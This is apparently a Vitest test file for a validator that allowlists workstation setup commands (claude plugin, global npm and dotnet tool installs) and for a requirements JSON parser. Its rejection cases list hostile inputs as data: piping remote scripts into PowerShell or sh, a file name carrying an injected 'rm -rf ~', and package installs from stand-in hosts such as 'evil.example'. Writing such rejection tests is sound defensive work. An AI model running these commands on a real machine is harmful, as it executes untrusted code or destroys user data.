import { describe, expect, it } from 'vitest'
import { isAllowedWorkstationFix, parseWorkstationRequirements } from './workstation-requirements'

describe('isAllowedWorkstationFix', () => {
  it.each([
    ['claude', 'plugin', 'install', 'inno-core@innonav'],
    ['claude', 'plugin', 'marketplace', 'add', 'INNONAV/claude-bc'],
    ['claude', 'plugin', 'marketplace', 'add', 'https://github.com/INNONAV/claude-bc'],
    ['npm', 'install', '-g', '@anthropic-ai/claude-code'],
    ['npm', 'i', '--global', 'typescript@5.4.0'],
    ['dotnet', 'tool', 'install', '-g', 'microsoft.dotnet-interactive'],
    ['dotnet', 'tool', 'install', '--global', 'alc', '--version', '1.2.3']
  ])('allows %s', (...argv) => {
    expect(isAllowedWorkstationFix(argv)).toBe(true)
  })

  it.each([
    ['powershell', '-Command', 'irm https://x | iex'],
    ['sh', '-c', 'curl https://x | sh'],
    ['claude', 'plugin', 'install', 'x; rm -rf ~'],
    ['claude', 'plugin', 'install', '--scope', 'user', 'x'],
    ['claude', 'auth', 'login'],
    ['claude', 'plugin', 'marketplace', 'add', 'https://user:pw@host/repo'],
    ['claude', 'plugin', 'marketplace', 'add', 'git@github.com:a/b.git'],
    ['claude', 'plugin', 'marketplace', 'add', './local'],
    ['npm', 'install', '-g', 'https://evil.example/x.tgz'],
    ['npm', 'install', '-g', 'github:a/b'],
    ['npm', 'install', '-g', 'a', 'b'],
    ['npm', 'install', 'left-pad'],
    ['npm', 'run', 'x'],
    ['dotnet', 'tool', 'install', '-g', 'a', '--add-source', 'https://evil'],
    ['dotnet', 'tool', 'install', '--interactive', 'a'],
    ['dotnet', 'workload', 'install', 'x'],
    [],
    ['claude', 'plugin', 'install', 5]
  ])('refuses %j', (...argv) => {
    expect(isAllowedWorkstationFix(argv)).toBe(false)
  })
})

describe('parseWorkstationRequirements', () => {
  it('parses every kind and keeps fix argv as given', () => {
    const parsed = parseWorkstationRequirements(
      JSON.stringify({
        requirements: [
          { id: 'node', kind: 'command', command: 'node', minVersion: '20.11' },
          {
            id: 'mk',
            kind: 'claude-marketplace',
            name: 'innonav',
            fix: ['claude', 'plugin', 'marketplace', 'add', 'a/b']
          },
          { id: 'pl', kind: 'claude-plugin', name: 'inno-core' },
          { id: 'p', kind: 'path-entry', entry: '~/.dotnet/tools' }
        ]
      })
    )
    expect(parsed.ok && parsed.requirements.map((entry) => entry.kind)).toEqual([
      'command',
      'claude-marketplace',
      'claude-plugin',
      'path-entry'
    ])
  })

  it.each([
    'nope',
    '{}',
    JSON.stringify({ requirements: [{ id: 'a', kind: 'shell', command: 'x' }] }),
    JSON.stringify({ requirements: [{ id: 'a', kind: 'command', command: 'x y' }] }),
    JSON.stringify({
      requirements: [{ id: 'a', kind: 'command', command: 'x', fix: 'npm i -g x' }]
    }),
    JSON.stringify({
      requirements: [
        { id: 'a', kind: 'command', command: 'x' },
        { id: 'a', kind: 'command', command: 'y' }
      ]
    })
  ])('rejects %s', (text) => {
    expect(parseWorkstationRequirements(text).ok).toBe(false)
  })
})
